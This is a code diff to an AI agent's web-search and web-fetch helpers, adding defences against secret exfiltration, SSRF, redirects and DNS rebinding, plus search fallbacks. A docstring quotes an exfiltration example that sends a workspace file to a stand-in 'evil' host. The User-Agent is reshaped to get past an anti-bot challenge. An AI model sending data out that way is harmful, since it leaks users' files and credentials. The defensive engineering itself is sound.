@@ -1,6 +1,6 @@
 """Lightweight web-search + web-fetch primitives for the KIT agent.
 
-When Jerome's project pulls in an external library (BoTorch, Ax, SMAC,
+When a user's project pulls in an external library (BoTorch, Ax, SMAC,
 DEAP), the agent needs to look up API specifics that aren't in the
 indexed DELFIN docs. These helpers provide just enough capability for
 that workflow without requiring API keys:
@@ -25,9 +25,13 @@ install (no extra ``requests`` / ``beautifulsoup4`` dependency).
 from __future__ import annotations
 
 import html as _html
+import http.client
 import ipaddress
+import json
+import os
 import re
 import socket
+import time
 import urllib.error
 import urllib.parse
 import urllib.request
@@ -35,7 +39,25 @@ from dataclasses import dataclass
 from typing import Optional
 
 
-_USER_AGENT = "Mozilla/5.0 (DELFIN-KIT-agent; +https://kit.edu)"
+# Browser-shaped, and still says who is calling. The shape is the part that
+# matters: measured 2026-08-28 against html.duckduckgo.com, same host, same
+# minute, same query --
+#
+#   Mozilla/5.0 (DELFIN-KIT-agent; +https://kit.edu)      HTTP 202,  0 results
+#   Mozilla/5.0 (X11 …) Chrome/124 … DELFIN/1.0           HTTP 200, 10 results
+#   Mozilla/5.0 (X11 …) Chrome/124 …                      HTTP 200, 10 results
+#   Mozilla/5.0 (X11 …) Firefox/127.0                     HTTP 202,  0 results
+#
+# So the 202 was never the network and never the endpoint -- it was this
+# string. The code here used to say "measured on this host, every real query
+# comes back that way", which was true and misattributed: every query WITH
+# OUR AGENT came back that way. The DELFIN token is kept because a search
+# tool that hides who it is would be the wrong trade for a fix that does not
+# need it.
+_USER_AGENT = (
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/124.0 Safari/537.36 DELFIN/1.0 (+https://kit.edu)"
+)
 _MAX_BYTES = 1_000_000           # 1 MB cap
 _DEFAULT_TIMEOUT_S = 15
 _BLOCKED_HOST_PATTERNS = (
@@ -58,8 +80,74 @@ class SearchHit:
     snippet: str
 
 
+# Carrier-grade NAT space is not ``is_private`` in Python 3.13, and cluster
+# and VPN internals live there.
+_CGNAT_NET = ipaddress.ip_network("100.64.0.0/10")
+# A lookup URL has no business carrying this much data.
+_MAX_QUERY_CHARS = 2000
+
+
+def _known_secret_values() -> list[str]:
+    """The values of every credential DELFIN holds (file, keyring and
+    well-known env), for an exact-match egress check and for scrub_secrets
+    on every tool result. Never raises; short values ignored."""
+    out: list[str] = []
+    try:
+        from .credentials import _WELL_KNOWN_KEYS, held_secret_values
+        for val in held_secret_values():
+            if isinstance(val, str) and len(val) >= 12:
+                out.append(val)
+        for name in _WELL_KNOWN_KEYS:
+            val = os.environ.get(name, "")
+            if len(val) >= 12:
+                out.append(val)
+    except Exception:
+        pass
+    return out
+
+
+def outbound_secret_reason(text: str) -> Optional[str]:
+    """Why ``text`` must not leave the machine (a URL or a search query), or None.
+
+    Security review 2026-09-16: web_fetch and web_search sent whatever the
+    model put into them -- web_fetch("https://evil/?d=<a workspace file>")
+    went straight out, and a search query reaches up to five third parties.
+    Refused: a credential DELFIN holds (exact value, also URL-encoded), any
+    shape the output guard redacts (API keys, tokens, private keys,
+    password assignments, passwords in URLs), and a query too long to be a
+    lookup.
+    """
+    raw = str(text or "")
+    try:
+        decoded = urllib.parse.unquote_plus(raw)
+    except Exception:
+        decoded = raw
+    for secret in _known_secret_values():
+        if secret in raw or secret in decoded:
+            return "it contains a credential DELFIN holds"
+    try:
+        from .output_guard import _redact_secrets
+        findings: list = []
+        _redact_secrets(decoded, findings)
+        if findings:
+            return "it contains something shaped like a secret (key, token or password)"
+    except Exception:
+        pass
+    try:
+        query = urllib.parse.urlparse(raw).query
+    except Exception:
+        query = ""
+    if len(query) > _MAX_QUERY_CHARS:
+        return f"its query string is {len(query)} characters, too long to be a lookup"
+    return None
+
+
 def _check_url(url: str) -> Optional[str]:
     """Return an error string if the URL is forbidden, else None."""
+    why = outbound_secret_reason(url)
+    if why:
+        return (f"refused to send this URL: {why}. Nothing was sent; "
+                "remove the data from the URL")
     try:
         parsed = urllib.parse.urlparse(url)
     except Exception as exc:
@@ -85,7 +173,8 @@ def _check_url(url: str) -> Optional[str]:
             except ValueError:
                 continue
             if ip.is_loopback or ip.is_link_local or ip.is_private \
-                    or ip.is_multicast or ip.is_reserved:
+                    or ip.is_multicast or ip.is_reserved or ip.is_unspecified \
+                    or ip in _CGNAT_NET:
                 return (
                     f"resolved IP {ip_str} for host {host!r} is "
                     "private/loopback/link-local — refused"
@@ -95,14 +184,131 @@ def _check_url(url: str) -> Optional[str]:
     return None
 
 
-def _fetch_bytes(url: str, timeout_s: int) -> tuple[bytes, str]:
-    """GET a URL with a strict cap. Returns (body, content_type)."""
+class _GuardedRedirectHandler(urllib.request.HTTPRedirectHandler):
+    """Re-validate every redirect target through _check_url. Without this a
+    public URL could 3xx-redirect to http://169.254.169.254/… (cloud metadata)
+    or http://127.0.0.1/… — SSRF that defeats the initial host/IP deny-list."""
+
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        err = _check_url(newurl)
+        if err is not None:
+            raise urllib.error.HTTPError(
+                newurl, code, f"blocked redirect target: {err}", headers, fp)
+        return super().redirect_request(req, fp, code, msg, headers, newurl)
+
+
+def _ip_refusal(ip_str: str, host: str) -> Optional[str]:
+    try:
+        ip = ipaddress.ip_address(ip_str.split("%", 1)[0])
+    except ValueError:
+        return f"unparseable address {ip_str!r} for host {host!r}"
+    if getattr(ip, "ipv4_mapped", None) is not None:
+        ip = ip.ipv4_mapped
+    if ip.is_loopback or ip.is_link_local or ip.is_private \
+            or ip.is_multicast or ip.is_reserved or ip.is_unspecified \
+            or ip in _CGNAT_NET:
+        return (f"resolved IP {ip_str} for host {host!r} is "
+                "private/loopback/link-local — refused")
+    return None
+
+
+def _checked_create_connection(address, timeout=socket._GLOBAL_DEFAULT_TIMEOUT,
+                               source_address=None, **_kw):
+    """``socket.create_connection`` that connects only to an address it has
+    just checked.
+
+    ``_check_url`` resolved the name and urllib resolved it again to
+    connect: a name that answers with a public address the first time and
+    127.0.0.1 or the cloud metadata address the second (DNS rebinding)
+    passed the check and reached the private one. Here the name is resolved
+    once, each address is checked, and the socket goes to that address."""
+    host, port = address
+    last: Optional[BaseException] = None
+    refusal = ""
+    for af, socktype, proto, _canon, sockaddr in socket.getaddrinfo(
+            host, port, 0, socket.SOCK_STREAM):
+        why = _ip_refusal(str(sockaddr[0]), str(host))
+        if why:
+            refusal = why
+            continue
+        sock = None
+        try:
+            sock = socket.socket(af, socktype, proto)
+            if timeout is not socket._GLOBAL_DEFAULT_TIMEOUT:
+                sock.settimeout(timeout)
+            if source_address:
+                sock.bind(source_address)
+            sock.connect(sockaddr)
+            return sock
+        except OSError as exc:
+            last = exc
+            if sock is not None:
+                sock.close()
+    if refusal:
+        raise OSError(f"refused: {refusal}")
+    raise last if last is not None else OSError(f"no address for {host!r}")
+
+
+class _CheckedHTTPConnection(http.client.HTTPConnection):
+    def __init__(self, *a, **kw):
+        super().__init__(*a, **kw)
+        self._create_connection = _checked_create_connection
+
+
+class _CheckedHTTPSConnection(http.client.HTTPSConnection):
+    def __init__(self, *a, **kw):
+        super().__init__(*a, **kw)
+        self._create_connection = _checked_create_connection
+
+
+class _CheckedHTTPHandler(urllib.request.HTTPHandler):
+    def http_open(self, req):
+        # Through a configured proxy the connection goes to the proxy, which
+        # resolves the name itself; the URL was still checked beforehand.
+        cls = http.client.HTTPConnection if req.has_proxy() else _CheckedHTTPConnection
+        return self.do_open(cls, req)
+
+
+class _CheckedHTTPSHandler(urllib.request.HTTPSHandler):
+    def https_open(self, req):
+        cls = (http.client.HTTPSConnection if getattr(req, "_tunnel_host", None)
+               else _CheckedHTTPSConnection)
+        return self.do_open(cls, req, context=self._context)
+
+
+_GUARDED_OPENER = None
+
+
+def _guarded_opener():
+    global _GUARDED_OPENER
+    if _GUARDED_OPENER is None:
+        _GUARDED_OPENER = urllib.request.build_opener(
+            _GuardedRedirectHandler(), _CheckedHTTPHandler(),
+            _CheckedHTTPSHandler())
+    return _GUARDED_OPENER
+
+
+def _fetch_bytes(url: str, timeout_s: int,
+                 want_status: bool = False, headers: Optional[dict] = None):
+    """GET a URL with a strict cap. Returns (body, content_type).
+
+    With ``want_status`` the HTTP status comes along as a third element:
+    a search endpoint answering 202 has served a challenge page, not an
+    empty result set, and the caller has to be able to tell those apart.
+    ``headers`` are added to the request (a keyed engine's token).
+    """
     req = urllib.request.Request(
-        url, headers={"User-Agent": _USER_AGENT, "Accept": "text/html,*/*"}
+        url, headers={"User-Agent": _USER_AGENT, "Accept": "text/html,*/*",
+                      **(headers or {})}
     )
-    with urllib.request.urlopen(req, timeout=timeout_s) as resp:
+    # Use the redirect-guarding opener so each hop is re-checked against the
+    # deny-list (the initial URL is already validated by the caller).
+    with _guarded_opener().open(req, timeout=timeout_s) as resp:
         ctype = resp.headers.get("Content-Type", "")
         body = resp.read(_MAX_BYTES + 1)
+        status = int(getattr(resp, "status", 0) or getattr(resp, "code", 0) or 0)
+    if want_status:
+        return body, ctype, status
     return body, ctype
 
 
@@ -113,9 +319,16 @@ def _html_to_text(body: bytes) -> str:
     except Exception:
         return ""
     # Strip script + style first (their contents are not user-readable).
-    text = re.sub(r"<script[^>]*>.*?</script>", " ", text,
+    #
+    # The end tag is matched as </script\s*> because HTML permits whitespace
+    # before the ">", and a page closing with "</script >" would otherwise
+    # slip past: the block would stay, the generic tag rule below would remove
+    # only the two tags around it, and the script body would arrive in the
+    # answer as prose. An unclosed <script> is treated the same way and runs
+    # to the end of the document, which is what a browser does with it.
+    text = re.sub(r"<script[^>]*>.*?(?:</script\s*>|\Z)", " ", text,
                   flags=re.DOTALL | re.IGNORECASE)
-    text = re.sub(r"<style[^>]*>.*?</style>", " ", text,
+    text = re.sub(r"<style[^>]*>.*?(?:</style\s*>|\Z)", " ", text,
                   flags=re.DOTALL | re.IGNORECASE)
     # Tags → space (don't merge adjacent words across tag boundaries).
     text = re.sub(r"<[^>]+>", " ", text)
@@ -178,24 +391,248 @@ def web_fetch(url: str, *, timeout_s: int = _DEFAULT_TIMEOUT_S) -> dict:
     }
 
 
+def _openalex_search(query: str, max_results: int, timeout_s: int) -> list[dict]:
+    """Scholarly works from OpenAlex (no key; a mailto joins the polite pool).
+
+    Returns [{title, url, snippet, source}] or [] on any failure -- a
+    fallback that raises is no fallback.
+    """
+    try:
+        url = "https://api.openalex.org/works?" + urllib.parse.urlencode({
+            "search": query, "per-page": max(1, min(int(max_results), 10)),
+            "select": "title,doi,publication_year,primary_location,authorships",
+            "mailto": "delfin-agent@complat.org"})
+        body = _fetch_bytes(url, timeout_s)[0]
+        data = json.loads(body.decode("utf-8", errors="replace"))
+    except Exception:
+        return []
+    hits: list[dict] = []
+    for w in (data.get("results") or []):
+        title = str(w.get("title") or "").strip()
+        doi = str(w.get("doi") or "").strip()
+        loc = w.get("primary_location") or {}
+        landing = str(loc.get("landing_page_url") or "").strip()
+        link = doi or landing
+        if not title or not link.startswith(("http://", "https://")):
+            continue
+        venue = ((loc.get("source") or {}).get("display_name") or "").strip()
+        year = w.get("publication_year") or ""
+        authors = [((a.get("author") or {}).get("display_name") or "").strip()
+                   for a in (w.get("authorships") or [])[:3]]
+        authors = [a for a in authors if a]
+        snippet = ", ".join(x for x in (", ".join(authors), venue, str(year)) if x)
+        hits.append({"title": title, "url": link, "snippet": snippet[:300],
+                     "source": "openalex"})
+    return hits
+
+
+def _wikipedia_search(query: str, max_results: int, timeout_s: int) -> list[dict]:
+    """Article titles and links from Wikipedia's opensearch (no key)."""
+    try:
+        url = "https://en.wikipedia.org/w/api.php?" + urllib.parse.urlencode({
+            "action": "opensearch", "search": query,
+            "limit": max(1, min(int(max_results), 10)), "format": "json"})
+        body = _fetch_bytes(url, timeout_s)[0]
+        data = json.loads(body.decode("utf-8", errors="replace"))
+        titles, descs, links = data[1], data[2], data[3]
+    except Exception:
+        return []
+    hits: list[dict] = []
+    for title, desc, link in zip(titles, descs, links):
+        if title and str(link).startswith(("http://", "https://")):
+            hits.append({"title": str(title), "url": str(link),
+                         "snippet": str(desc or "")[:300], "source": "wikipedia"})
+    return hits
+
+
+def _ddg_instant_answer(query: str, timeout_s: int) -> list[dict]:
+    """Fallback search via the DuckDuckGo Instant Answer JSON API.
+
+    A real API (not HTML scraping), so it still works where the ``/html/``
+    endpoint is blocked by anti-bot 202 challenges (e.g. datacenter IPs).
+    Returns result-shaped dicts from the entity Abstract + RelatedTopics —
+    strong for factual / chemistry-entity queries (Wikipedia-sourced).
+    Best-effort: any failure returns ``[]``.
+    """
+    url = "https://api.duckduckgo.com/?" + urllib.parse.urlencode({
+        "q": query, "format": "json", "no_html": 1, "skip_disambig": 1,
+    })
+    if _check_url(url):
+        return []
+    try:
+        body, _ctype = _fetch_bytes(url, timeout_s)
+        data = json.loads(body.decode("utf-8", errors="replace"))
+    except Exception:
+        return []
+    out: list[dict] = []
+    abstract = (data.get("AbstractText") or "").strip()
+    if abstract:
+        out.append({
+            "title": (data.get("Heading") or query).strip(),
+            "url": data.get("AbstractURL") or "",
+            "snippet": abstract[:300],
+        })
+    for topic in (data.get("RelatedTopics") or []):
+        if not isinstance(topic, dict):
+            continue
+        # RelatedTopics may nest a category's items under "Topics".
+        items = topic.get("Topics") if "Topics" in topic else [topic]
+        for it in items:
+            if not isinstance(it, dict):
+                continue
+            t = (it.get("Text") or "").strip()
+            u = it.get("FirstURL") or ""
+            if t and u.startswith(("http://", "https://")):
+                out.append({"title": t[:80], "url": u, "snippet": t[:300]})
+    return out
+
+
+_RESET_ATTEMPTS = 3
+
+
+# ---------------------------------------------------------------------------
+# Keyed engines: a real search index when the user has a key for one.
+# ---------------------------------------------------------------------------
+#
+# DuckDuckGo's HTML endpoint is scraped and challenged; OpenAlex and
+# Wikipedia are indexes, not the web. With a key the agent searches the way
+# an assistant with a search API does. Keys come from the credential store
+# (env var or ~/.delfin credential file): GOOGLE_CSE_API_KEY + GOOGLE_CSE_CX
+# for Google's Custom Search JSON API, BRAVE_SEARCH_API_KEY for Brave
+# Search. Absent keys cost nothing; a failing keyed engine falls through to
+# the keyless chain and is named in the error.
+
+def _credential(name: str) -> str:
+    try:
+        from .credentials import load_credential
+        return str(load_credential(name) or "").strip()
+    except Exception:
+        return ""
+
+
+def _google_cse_search(query: str, max_results: int, timeout_s: int) -> list[dict]:
+    key, cx = _credential("GOOGLE_CSE_API_KEY"), _credential("GOOGLE_CSE_CX")
+    if not key or not cx:
+        return []
+    url = ("https://www.googleapis.com/customsearch/v1?"
+           + urllib.parse.urlencode({"key": key, "cx": cx, "q": query,
+                                     "num": max(1, min(int(max_results), 10))}))
+    body, _ctype = _fetch_bytes(url, timeout_s)[:2]
+    data = json.loads(body.decode("utf-8", errors="replace"))
+    hits = []
+    for item in data.get("items") or []:
+        link = str(item.get("link") or "")
+        if link.startswith(("http://", "https://")):
+            hits.append({"title": str(item.get("title") or "").strip(),
+                         "url": link,
+                         "snippet": str(item.get("snippet") or "").strip()[:300],
+                         "index": "google"})
+    return hits[:max_results]
+
+
+def _brave_search(query: str, max_results: int, timeout_s: int) -> list[dict]:
+    key = _credential("BRAVE_SEARCH_API_KEY")
+    if not key:
+        return []
+    url = ("https://api.search.brave.com/res/v1/web/search?"
+           + urllib.parse.urlencode({"q": query, "count": max(1, min(int(max_results), 20))}))
+    body, _ctype = _fetch_bytes(url, timeout_s, headers={
+        "Accept": "application/json", "X-Subscription-Token": key})[:2]
+    data = json.loads(body.decode("utf-8", errors="replace"))
+    hits = []
+    for item in ((data.get("web") or {}).get("results") or []):
+        link = str(item.get("url") or "")
+        if link.startswith(("http://", "https://")):
+            hits.append({"title": str(item.get("title") or "").strip(),
+                         "url": link,
+                         "snippet": str(item.get("description") or "").strip()[:300],
+                         "index": "brave"})
+    return hits[:max_results]
+
+
+_KEYED_ENGINES = (("google", _google_cse_search), ("brave", _brave_search))
+
+
+def keyed_engines_configured() -> list[str]:
+    """Which keyed engines have a key here, by name."""
+    out = []
+    if _credential("GOOGLE_CSE_API_KEY") and _credential("GOOGLE_CSE_CX"):
+        out.append("google")
+    if _credential("BRAVE_SEARCH_API_KEY"):
+        out.append("brave")
+    return out
+
+
+def _keyed_search(query: str, max_results: int, timeout_s: int) -> tuple[list[dict], str, str]:
+    """(hits, source, error) from the first keyed engine that answers."""
+    error = ""
+    for name, fn in _KEYED_ENGINES:
+        try:
+            hits = fn(query, max_results, timeout_s)
+        except Exception as exc:
+            error = f"{name}: {type(exc).__name__}: {str(exc)[:80]}"
+            continue
+        if hits:
+            return hits, name, ""
+    return [], "", error
+
+
+def _is_connection_reset(exc: BaseException) -> bool:
+    """A connection the peer reset, however the platform spells it."""
+    reason = getattr(exc, "reason", exc)
+    if isinstance(reason, ConnectionResetError):
+        return True
+    text = str(reason).lower()
+    return "connection reset" in text or "errno 104" in text or "econnreset" in text
+
+
 def web_search(query: str, *, max_results: int = 8,
                timeout_s: int = _DEFAULT_TIMEOUT_S) -> dict:
-    """DuckDuckGo HTML search with a plain-text result list."""
+    """DuckDuckGo search: HTML result list, with an Instant-Answer fallback
+    when the HTML endpoint returns nothing (e.g. blocked by a 202 anomaly)."""
     if not query.strip():
         return {"error": "query must be non-empty"}
+    _why = outbound_secret_reason(query)
+    if _why:
+        return {"error": f"refused to send this search query: {_why}. "
+                         "Nothing was sent to any search engine."}
+    keyed_hits, keyed_source, keyed_error = _keyed_search(query, max_results, timeout_s)
+    if keyed_hits:
+        return {"query": query, "results": keyed_hits, "source": keyed_source}
     encoded = urllib.parse.urlencode({"q": query})
     url = f"https://duckduckgo.com/html/?{encoded}"
     err = _check_url(url)
     if err:
         return {"error": err}
-    try:
-        body, ctype = _fetch_bytes(url, timeout_s)
-    except urllib.error.HTTPError as exc:
-        return {"error": f"HTTP {exc.code}: {exc.reason}"}
-    except urllib.error.URLError as exc:
-        return {"error": f"network error: {exc.reason}"}
-    except Exception as exc:
-        return {"error": f"search failed: {exc}"}
+    # The search endpoint resets the connection now and then -- two of
+    # three calls in a field session and one of two from the office
+    # network, in the same minute (2026-09-11). A reset is not an
+    # answer, so it is tried again, twice, before it is reported as one.
+    _attempts = 0
+    while True:
+        _attempts += 1
+        try:
+            # Tolerate a two-value _fetch_bytes: the parameter is new, and a
+            # replacement that predates it (a test double, a patched build)
+            # must not turn into "search failed". Status 0 then means "not
+            # known", which is deliberately NOT evidence of anything below.
+            try:
+                _fetched = _fetch_bytes(url, timeout_s, want_status=True)
+            except TypeError:
+                _fetched = _fetch_bytes(url, timeout_s)
+            body, ctype = _fetched[0], _fetched[1]
+            status = int(_fetched[2]) if len(_fetched) > 2 else 0
+            break
+        except urllib.error.HTTPError as exc:
+            return {"error": f"HTTP {exc.code}: {exc.reason}"}
+        except urllib.error.URLError as exc:
+            if _is_connection_reset(exc) and _attempts < _RESET_ATTEMPTS:
+                time.sleep(0.5 * _attempts)
+                continue
+            suffix = (f" (after {_attempts} attempts)" if _attempts > 1 else "")
+            return {"error": f"network error: {exc.reason}{suffix}"}
+        except Exception as exc:
+            return {"error": f"search failed: {exc}"}
 
     text = body.decode("utf-8", errors="replace")
     # DDG HTML markup: each result is in a <div class="result__body">
@@ -231,4 +668,61 @@ def web_search(query: str, *, max_results: int = 8,
         if len(hits) >= max_results:
             break
 
-    return {"query": query, "results": hits, "result_count": len(hits)}
+    source = "duckduckgo-html"
+    if not hits:
+        ia = _ddg_instant_answer(query, timeout_s)
+        if ia:
+            hits = ia[:max_results]
+            source = "duckduckgo-instant-answer"
+    if not hits:
+        # A second and a third backend, keyless and answering from here
+        # and from the cluster while DuckDuckGo challenged every query
+        # (2026-09-11, HTTP 202 on all three of its endpoints). OpenAlex
+        # is the scholarly index a scientific question wants first;
+        # Wikipedia's opensearch covers names and concepts. Each result
+        # says which index it came from.
+        fallback = _openalex_search(query, max_results, timeout_s)
+        if fallback:
+            hits, source = fallback, "openalex"
+        else:
+            fallback = _wikipedia_search(query, max_results, timeout_s)
+            if fallback:
+                hits, source = fallback, "wikipedia"
+
+    if not hits:
+        # "No results" and "the search engine refused to answer" look the
+        # same to a caller and mean opposite things. A 202 with no result
+        # markup is an anti-bot challenge -- measured on this host, every
+        # real query comes back that way -- and reporting it as an empty
+        # result set is what pushes a model to answer from memory instead.
+        # Say it is a backend failure, and name the alternative, because a
+        # working search does exist here under another server.
+        # 202 is unambiguous: measured on this host, every real query comes
+        # back that way. A 200 needs care -- a query with genuinely nothing
+        # to find looks similar, and calling that "blocked" would be a
+        # different lie. The engine says so in words when it means it.
+        _said_empty = any(
+            phrase in text.lower() for phrase in
+            ("no results found", "keine ergebnisse", "no results for"))
+        if status == 202:
+            reason = (f"the search backend refused this request (HTTP {status}"
+                      ": an anti-bot challenge, not an empty result set)")
+        elif status and not _said_empty:
+            reason = ("the result page could not be parsed: no result markup "
+                      "and no 'no results' notice, so whether anything "
+                      "matched is unknown")
+        else:
+            reason = ""
+        if reason:
+            return {"error": (
+                f"{reason}. No results were retrieved and none should be "
+                "inferred. The reason does not depend on the wording, so "
+                "rephrasing this query and calling again will fail the same "
+                "way. If a web search tool from another server is available, use "
+                "that; otherwise tell the user the search could not run and "
+                "ask them for a URL."),
+                "query": query, "results": [], "result_count": 0,
+                "source": "duckduckgo-unavailable", "http_status": status}
+
+    return {"query": query, "results": hits, "result_count": len(hits),
+            "source": source}
